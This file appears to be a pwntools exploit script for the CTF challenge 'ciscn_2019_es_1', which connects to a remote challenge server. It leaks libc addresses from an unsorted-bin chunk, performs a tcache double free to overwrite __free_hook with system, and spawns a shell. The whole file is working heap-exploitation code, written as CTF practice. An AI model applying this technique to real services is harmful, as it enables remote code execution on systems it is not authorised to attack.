# coding:utf-8
from glob import glob
from pwn import *
context.log_level = 'debug'

proc_name = './ciscn_2019_es_1'
islocal = 0
libc = ELF('/home/klose/ctf/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 29401)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def add(size, name, phone='6666'):
    p.recvuntil('choice:')
    p.sendline("1")
    p.recvuntil('name\n')
    p.sendline(str(size))
    p.recvuntil('name:\n')
    p.send(name)
    p.recvuntil('call:\n')
    p.sendline(str(phone))

def show(idx):
    p.recvuntil('choice:')
    p.sendline("2")
    p.recvuntil("index:\n")
    p.sendline(str(idx))

def call(idx):
    p.recvuntil('choice:')
    p.sendline("3")
    p.recvuntil("index:\n")
    p.sendline(str(idx))

def exit():
    p.recvuntil('choice:')
    p.sendline("4")

def leak():
    global __free_hook
    global system_addr
    add(0x410, 'klose', 7777)           # chunk0
    add(0x28, 'joyce', 8888)            # chunk1
    # debug(0)
    add(0x68, '/bin/sh\x00',6666)       # chunk2

    call(0)             # free chunk0, chunk0 -> unsorted bin
    # debug(0)
    show(0)             # chunk0_head_ptr -> chunk0_fd
    # debug(0)
    pause()
    fd_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))    # fd = main_arena + 96
    main_arena_addr = fd_addr - 96
    __malloc_hook = main_arena_addr - 0x10                       # distance main_arena __malloc_hook = 0x10
    libc_base = __malloc_hook - libc.sym['__malloc_hook']
    __free_hook = libc_base + libc.sym['__free_hook']
    system_addr = libc_base + libc.sym['system']

    log.success('fd_addr => ' + hex(fd_addr))
    log.success('main_arena_addr => ' + hex(main_arena_addr))
    log.success('__malloc_hook => ' + hex(__malloc_hook))
    log.success('libc_base => ' + hex(libc_base))
    log.success('__free_hook => ' + hex(__free_hook))
    log.success('system_addr => ' + hex(system_addr))
    pause()

def pwn():

    # double free
    call(1)
    # debug(0)
    call(1)
    # debug(0)
    add(0x28, p64(__free_hook), 5555)
    # debug(0)
    pause()
    add(0x28, 'aaaa', 4444)
    # debug(0)
    pause()
    add(0x28,p64(system_addr), 3333)
    # debug(0)
    call(2)
    pause(0)
    p.interactive()

if __name__ == '__main__':
    leak()
    pwn()